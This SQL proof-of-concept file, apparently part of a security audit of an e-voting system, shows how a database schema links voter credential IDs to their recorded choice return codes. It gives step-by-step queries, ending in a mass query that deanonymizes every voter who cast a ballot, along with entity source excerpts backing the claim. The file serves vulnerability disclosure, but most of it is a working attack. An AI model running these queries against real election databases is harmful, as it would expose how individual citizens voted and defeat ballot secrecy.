-- PoC: SP-007 + SP-008 — Vote Deanonymization via Return Code Linkability
--
-- Demonstrates that the database schema creates a direct path from
-- voter identity (credentialId) to their voting choices (shortChoiceReturnCodes),
-- completely bypassing the mixnet privacy guarantees.
--
-- Source:
--   VerificationCardEntity.java — links credentialId to verificationCardId
--   VerificationCardStateEntity.java — links verificationCardId to shortChoiceReturnCodes
--   ChoiceReturnCodesService.java:167 — persists return codes via saveSentState()
--
-- Tables involved:
--   VERIFICATION_CARD (verificationCardId PK, credentialId, votingCardId)
--   VERIFICATION_CARD_STATE (verificationCardId PK/FK, shortChoiceReturnCodes, shortVoteCastReturnCode)

-- ===================================================================
-- STEP 1: Given a known voter (by credentialId from election authority),
--         find their verification card
-- ===================================================================
SELECT
    vc.verification_card_id,
    vc.credential_id,
    vc.voting_card_id
FROM verification_card vc
WHERE vc.credential_id = 'target-voter-credential-id';

-- ===================================================================
-- STEP 2: Using the verificationCardId, retrieve their return codes
--         (which map directly to their voting choices)
-- ===================================================================
SELECT
    vcs.verification_card_id,
    vcs.short_choice_return_codes,    -- These ARE the voter's choices
    vcs.short_vote_cast_return_code,  -- Confirms vote was cast
    vcs.state                          -- SENT = vote submitted
FROM verification_card_state vcs
WHERE vcs.verification_card_id = '<from-step-1>';

-- ===================================================================
-- STEP 3: Single join to deanonymize any voter
-- ===================================================================
SELECT
    vc.credential_id                    AS voter_identity,
    vc.verification_card_id,
    vcs.short_choice_return_codes       AS voting_choices,
    vcs.short_vote_cast_return_code     AS vote_confirmed,
    vcs.state                           AS vote_state
FROM verification_card vc
JOIN verification_card_state vcs
    ON vc.verification_card_id = vcs.verification_card_id
WHERE vcs.state = 'SENT';  -- Only voters who submitted votes

-- ===================================================================
-- STEP 4: Mass deanonymization — all voters in an election
-- ===================================================================
SELECT
    vc.credential_id                    AS voter_identity,
    vcs.short_choice_return_codes       AS voting_choices,
    COUNT(*) OVER ()                    AS total_deanonymized_voters
FROM verification_card vc
JOIN verification_card_state vcs
    ON vc.verification_card_id = vcs.verification_card_id
WHERE vcs.short_choice_return_codes IS NOT NULL
ORDER BY vc.credential_id;

-- The election authority maintains credentialId-to-real-person mapping.
-- Combined with these queries, a database insider can determine
-- exactly how every voter voted — the mixnet is irrelevant.
--
-- Entity source code proving the schema:
--
-- VerificationCardEntity.java:
--   @Id private String verificationCardId;      // PK
--   @Column private String credentialId;         // Links to voter
--   @Column private String votingCardId;
--   @OneToOne @PrimaryKeyJoinColumn
--   private VerificationCardStateEntity verificationCardStateEntity;
--
-- VerificationCardStateEntity.java:
--   @Id private String verificationCardId;      // PK = FK
--   @Column private ImmutableList<String> shortChoiceReturnCodes;  // THE VOTES
--   @Column private String shortVoteCastReturnCode;
